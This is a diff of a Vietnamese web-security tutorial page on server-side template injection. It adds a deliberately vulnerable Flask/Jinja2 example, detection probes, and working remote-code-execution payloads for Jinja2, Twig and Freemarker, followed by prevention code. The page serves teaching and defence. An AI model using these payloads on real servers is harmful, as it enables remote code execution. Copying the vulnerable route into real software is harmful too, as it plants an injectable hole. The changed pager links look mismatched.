@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chương 25: SSTI — Hieu Nguyen</title>
-  <meta name="description" content="Server-side template injection, sandbox, không render user template.">
+  <title>Chương 25: SSTI — Server-Side Template Injection — Hieu Nguyen</title>
+  <meta name="description" content="Chương 25: SSTI — Server-Side Template Injection — Web Security notes.">
   <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -40,56 +40,105 @@
         <span>›</span>
         <span>25. SSTI</span>
       </div>
-      <h1>Chương 25: SSTI</h1>
-      <p class="lede">Template engine render string user. Đôi khi string đó là code.</p>
-      <div class="docs-meta">
-        <span><strong>Tác giả:</strong> Hieu Nguyen (Ryan)</span>
-        <span><strong>Phần:</strong> IV — Injection</span>
-        <span><strong>Cập nhật:</strong> Aug 2026</span>
-      </div>
-      <h2 id="khai-niem">Khái niệm</h2>
-<p>SSTI khi Jinja/Freemarker/Twig… compile input user như template. Hậu quả từ XSS tới RCE tùy engine — học chi tiết trên lab, vá bằng không render input như template.</p>
-<h2 id="phong">Phòng chống</h2>
-<ul>
-        <li>Template cố định trong repo; user data chỉ biến đã escape.</li>
-        <li>Không <code>from_string(user)</code>.</li>
-        <li>Sandbox engine nếu bắt buộc (vẫn coi là yếu).</li>
-        <li>Tách privilege process render.</li>
-      </ul>
-<h2 id="devops">Góc nhìn DevOps</h2>
-<p>Review PR có render template từ CMS. WAF không đủ. Container render không mount secret rộng.</p>
-<h2 id="tom-tat">Tóm tắt</h2>
-<ul>
-        <li>User input ≠ template source.</li>
-        <li>Escape context.</li>
-        <li>Sandbox không phải viên đạn bạc.</li>
-      </ul>
-<h2 id="on-tap">Câu hỏi ôn tập</h2>
-<ol>
-        <li>SSTI khác XSS chỗ nào?</li>
-        <li>from_string nguy hiểm vì sao?</li>
-        <li>Email template user-edit rủi ro gì?</li>
-        <li>Phát hiện SSTI trên lab khác production scan?</li>
-        <li>Quyền Pod render nên thế nào?</li>
-      </ol>
+      <div id="top"></div>
+<header><h1>Chương 25: SSTI — Server-Side Template Injection</h1></header>
+<h2 id="khái-niệm">Khái niệm</h2>
+<p><strong>SSTI</strong> (Server-Side Template Injection — Tiêm vào template phía server) xảy ra khi user input được nhúng trực tiếp vào template engine và được evaluate, thay vì được treated như data.</p>
+<p><strong>Mức độ nguy hiểm:</strong> Rất cao — SSTI thường dẫn đến RCE.</p>
+<hr>
+<h2 id="template-engines-phổ-biến">Template Engines phổ biến</h2>
+<table><thead><tr><th>Engine</th><th>Ngôn ngữ</th><th>Syntax</th></tr></thead><tbody><tr><td>Jinja2</td><td>Python</td><td><code>{{ }}</code>, <code>{% %}</code></td></tr><tr><td>Twig</td><td>PHP</td><td><code>{{ }}</code>, <code>{% %}</code></td></tr><tr><td>Freemarker</td><td>Java</td><td><code>${...}</code>, <code>&lt;#...&gt;</code></td></tr><tr><td>Thymeleaf</td><td>Java</td><td><code>${...}</code>, <code>th:*</code></td></tr><tr><td>ERB</td><td>Ruby</td><td><code>&lt;%= %&gt;</code>, <code>&lt;% %&gt;</code></td></tr><tr><td>Pebble</td><td>Java</td><td><code>{{ }}</code>, <code>{% %}</code></td></tr></tbody></table>
+<hr>
+<h2 id="cách-hoạt-động">Cách hoạt động</h2>
+<pre><code class="language-python"># Vulnerable Jinja2
+from jinja2 import Template
 
-      <div class="docs-tags">
-        <span class="docs-tag">ssti</span>
-        <span class="docs-tag">templates</span>
-      </div>
+@app.route(&#x27;/hello&#x27;)
+def hello():
+    name = request.args.get(&#x27;name&#x27;)
+    # SAI: string interpolation trước khi template render
+    template = Template(f&quot;Hello {name}!&quot;)  # ← Inject point!
+    return template.render()
+
+# Normal: name=Alice → &quot;Hello Alice!&quot;
+# Attack: name={{ 7*7 }} → &quot;Hello 49!&quot; → Template evaluated!
+# Attack: name={{ config }} → leak Flask config (secret key!)
+</code></pre>
+<hr>
+<h2 id="detection">Detection</h2>
+<pre><code class="language-text">Fuzz với: ${{&lt;%[%&#x27;&quot;}}%\
+→ Nếu error → template engine present
+
+Mathematical expressions:
+${7*7} → 49 (Jinja2/Twig)
+&lt;%= 7*7 %&gt; → 49 (ERB)
+#{7*7} → 49 (Ruby template)
+{{7*7}} → 49 (Jinja2)
+{{7*&#x27;7&#x27;}} → &#x27;7777777&#x27; (Jinja2 với Python multiplication)
+            → 49 (Twig với PHP multiplication)
+→ Phân biệt engine
+</code></pre>
+<hr>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="jinja2-rce">Jinja2 RCE</h3>
+<pre><code class="language-python"># Payload để đạt RCE trong Jinja2
+{{config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()}}
+
+# Hoặc qua MRO (Method Resolution Order)
+{{&#x27;&#x27;.__class__.__mro__[1].__subclasses__()}}
+# → List tất cả subclasses → tìm subprocess.Popen
+
+{{&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[408](&#x27;id&#x27;, shell=True, stdout=-1).communicate()}}
+
+# Ngắn hơn:
+{{self.__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()}}
+</code></pre>
+<h3 id="twig-rce">Twig RCE</h3>
+<pre><code class="language-php">{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}
+</code></pre>
+<h3 id="freemarker-rce">Freemarker RCE</h3>
+<pre><code class="language-text">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt;${ ex(&quot;id&quot;) }
+</code></pre>
+<hr>
+<h2 id="phòng-chống">Phòng chống</h2>
+<pre><code class="language-python"># ĐÚNG: Pass data riêng biệt, không string interpolation
+from jinja2 import Environment, select_autoescape
+
+env = Environment(autoescape=select_autoescape([&#x27;html&#x27;, &#x27;xml&#x27;]))
+template = env.from_string(&quot;Hello {{ name }}!&quot;)  # Template literal
+return template.render(name=user_input)  # Data riêng biệt
+
+# Sandbox Jinja2
+from jinja2.sandbox import SandboxedEnvironment
+env = SandboxedEnvironment()
+# Giới hạn access đến Python internals
+</code></pre>
+<hr>
+<h2 id="tóm-tắt">Tóm tắt</h2>
+<ul>
+<li>SSTI: user input evaluated như template code → RCE.</li>
+<li>Detect: <code>{{7*7}}</code> → 49.</li>
+<li>Exploit: access Python internals qua MRO, <code>os.popen()</code>.</li>
+<li>Phòng chống: không concat user input vào template string, dùng render(data=input).</li>
+</ul>
       <div class="docs-pager">
-        <a href="../24/">Previous · 24. Request Smuggling</a>
-        <a href="../26/">Next · 26. Deserialization</a>
+        <a href="../16/">Previous · 16. XXE</a>
+        <a href="../15/">Next · 15. SSRF</a>
       </div>
     </article>
     <aside class="docs-toc">
       <div class="docs-toc-title">On this page</div>
       <nav>
-        <a href="#khai-niem">Khái niệm</a>
-        <a href="#phong">Phòng chống</a>
-        <a href="#devops">Góc nhìn DevOps</a>
-        <a href="#tom-tat">Tóm tắt</a>
-        <a href="#on-tap">Câu hỏi ôn tập</a>
+        <a href="#khái-niệm">Khái niệm</a>
+        <a href="#template-engines-phổ-biến">Template Engines phổ biến</a>
+        <a href="#cách-hoạt-động">Cách hoạt động</a>
+        <a href="#detection">Detection</a>
+        <a href="#exploitation">Exploitation</a>
+        <a class="depth-3" href="#jinja2-rce">Jinja2 RCE</a>
+        <a class="depth-3" href="#twig-rce">Twig RCE</a>
+        <a class="depth-3" href="#freemarker-rce">Freemarker RCE</a>
+        <a href="#phòng-chống">Phòng chống</a>
+        <a href="#tóm-tắt">Tóm tắt</a>
       </nav>
     </aside>
   </div>
